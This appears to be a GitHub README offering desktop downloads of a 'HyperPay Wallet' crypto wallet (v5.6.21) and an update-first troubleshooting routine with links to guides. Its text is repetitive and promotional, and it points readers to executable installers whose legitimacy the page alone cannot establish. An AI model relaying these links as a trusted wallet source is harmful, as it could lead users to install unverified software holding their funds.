<p align="center"><img src="assets/banner-profile.png" alt="HyperPay - crypto wallet, card and custody"></p>

<h1 align="center">HyperPay Wallet</h1>

<p align="center">Most of the faults people report on an old build disappear on the current one, and that is where a wallet problem should start.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

The release page carries the three files and their hashes; a build obtained anywhere else has no provenance to check.

> Only download from this GitHub release page.

---

## Why HyperPay

An installation that is two releases behind is the quiet cause behind a surprising share of wallet complaints: a balance that will not refresh, a connection that keeps dropping, a screen that no longer matches the documentation. Updating is usually the shortest repair, and the guides below explain why it comes before a reinstall. Reading them in order turns a vague fault into a specific check.

The application is a hybrid wallet from 2017: custodial balances are managed through HyperBC custody, self-custody keys are generated locally under BIP32, BIP39, BIP44 and BIP45, and both live in one account. Desktop builds for Windows, macOS and Linux ship from a single tag, while the prepaid card, the hardware devices and the exchange sit in the same application.

An old build is the least dramatic explanation for a dramatic symptom, and it is the one most often missed. Before a reinstall, before a support ticket and before a phrase is typed anywhere, the version screen answers whether the fault is already fixed. The order below is deliberately unglamorous: read the version, compare it with the release page, update, and only then treat the problem as new. A support thread describes the build it was written for, and a fix that matches an older release sends a reader down the wrong path. Starting from the version costs a minute and removes that whole class of detour.

- Update before troubleshooting, because the current build removes the faults an old one keeps.
- Reinstall only after the phrase has been checked and backed up somewhere else.
- Read the version on the release page, not from memory or from a support thread.
- Confirm the installer hash, since a correct filename says nothing about the bytes inside it.
- Note the version before and after an update, so a change can be attributed rather than guessed.
- Keep the previous installer until the new build has opened once and shown the balance.
- Compare the version string with the release tag before opening a ticket, because the answer is often already there.

## Guides for a build that misbehaves

<div align="center">

| Guide | What it settles |
| --- | --- |
| [Update to the current build](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/update-hyperpay-to-the-latest-build.md) | Shows how to move to the newest desktop release and why it fixes most faults. |
| [Stuck on connecting or syncing](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/hyperpay-wallet-stuck-on-syncing.md) | Works through the connection states in the order that resolves them most often. |
| [Reinstall without losing funds](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/reinstall-hyperpay-without-losing-funds.md) | Sets the backup, removal and reinstall order that keeps a balance reachable. |
| [Login problems](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/fix-hyperpay-wallet-login-problems.md) | Covers password resets, two-factor codes and locked accounts on the desktop build, and states which recovery each case allows. |

</div>

## This page's place in the project

This repository is one of the wallet's public repositories, and this README is its landing page with the download block and the reading order; the guides themselves are collected in [hyperpay-wallet-guide](https://github.com/hyperpay-gateway/hyperpay-wallet-guide).

## Common first questions

### Where do I read the installed version?

The application shows its build string on the version screen, and the release page shows the current tag. Comparing the two is the whole check, and it needs no network beyond the page you are already on.

### Will updating keep my wallet and my balance?

An update replaces the application rather than the wallet data, and the phrase remains the recovery route either way. Backing up first costs minutes and covers the case where an update fails midway.

### Should I reinstall instead of updating?

Reinstalling removes more than it repairs, so it belongs after the update has been tried. If a reinstall is needed, the guide sets the backup and restore order that keeps the balance reachable.

### Is this the same build as the mobile application?

No. The desktop build and the phone build are separate releases with different numbering, and a step written for one will not always match the other.

### What if the update fails halfway through?

The wallet data is separate from the application, so the phrase remains the recovery route. Reinstall the current build and restore from the phrase, then check the balance before moving funds.

## Security

Never share the recovery phrase, never type it into a page that a message sent you, and treat any request for a wallet screen share as theft in progress. Nothing in this repository collects credentials.

## Support

The in-app help channel is the support route, with `support@hyperpay.dev` published on the site. This repository has no support queue of its own.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">All 55 guides</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
